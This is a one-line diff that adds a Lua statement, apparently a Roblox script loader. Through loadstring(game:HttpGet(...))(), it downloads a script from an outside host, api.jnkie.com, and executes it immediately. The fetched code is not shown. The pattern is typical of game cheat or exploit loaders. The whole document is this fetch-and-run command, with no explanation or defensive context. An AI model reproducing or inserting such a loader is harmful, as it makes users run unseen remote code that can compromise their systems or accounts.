@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/fe7c9dfdf3111b9857c302ea324e613add4d245923f672bd16dd775b7e368137/download"))()
